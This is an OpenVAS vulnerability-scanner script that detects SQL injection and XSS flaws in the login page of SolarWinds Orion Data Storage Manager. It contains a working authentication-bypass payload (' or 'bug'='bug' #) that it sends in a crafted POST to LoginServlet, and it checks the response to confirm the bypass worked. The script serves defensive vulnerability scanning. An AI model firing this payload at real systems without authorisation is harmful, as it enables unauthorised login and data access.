##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_solarwinds_orion_storage_manager_mult_vuln.nasl 5956 2017-04-14 09:02:12Z teissa $
#
# SolarWinds Orion Data Storage Manager SQL Injection and XSS Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation could allow an attacker to steal
cookie-based authentication credentials, compromise the application,
access or modify data, or exploit latent vulnerabilities in the
underlying database.

Impact Level: Application";

tag_affected = "SolarWinds Storage Manager Server version 5.1.2 and prior.";

tag_insight = 
"Multiple flaws are due to an,
- Input passed via the 'loginName' and 'password' parameters to
  'LoginServlet' page is not properly sanitised before being used in a SQL
  query. This can be exploited to manipulate SQL queries by injecting
  arbitrary SQL code.
- Input passed to the 'loginName' parameter in 'LoginServlet' page is not
  properly verified before it is returned to the user. This can be exploited
  to execute arbitrary HTML and script code in a user's browser session in
  the context of a vulnerable site.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running SolarWinds Orion Data Storage Manager and
is prone SQL injection and cross site scripting vulnerabilities.";

if(description)
{
  script_id(902902);
  script_version("$Revision: 5956 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-04-14 11:02:12 +0200 (Fri, 14 Apr 2017) $");
  script_tag(name:"creation_date", value:"2012-01-24 11:53:50 +0530 (Tue, 24 Jan 2012)");
  script_name("SolarWinds Orion Data Storage Manager SQL Injection and XSS Vulnerabilities");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/521328");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2012/Jan/384");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/109007/DDIVRT-2011-39.txt");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2012 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 9000);
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Check for the default port
dsmPort = get_http_port(default:9000);
if(!dsmPort){
  dsmPort = 9000;
}

## Check the port state
if(!get_port_state(dsmPort)){
  exit(0);
}

## request index page
sndReq = http_get(item:"/LoginServlet", port:dsmPort);
rcvRes = http_send_recv(port:dsmPort, data:sndReq);

## Confirm the Application
if("SolarWinds Storage Manager" >!< rcvRes || ">SolarWinds" >!< rcvRes){
  exit(0);
}

## Try an exploit
exploit = "loginState=checkLogin&loginName=%27+or+%27bug%27%3D" +
          "%27bug%27+%23&password=%27+or+%27bug%27%3D%27bug%27+%23";

## Construct post request
sndReq = string("POST /LoginServlet HTTP/1.1\r\n",
                "Host: ", get_host_name(), "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(exploit), "\r\n\r\n",
                 exploit);
rcvRes = http_keepalive_send_recv(port:dsmPort, data:sndReq);

## Confirm exploit worked by checking the response
if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:rcvRes) &&
  'statusRefresh.document.location.href = "/jsp/Enterprise' +
  'StatusHidden.jsp' >< rcvRes && ">Login<" >!< rcvRes){
    security_message(dsmPort);
}
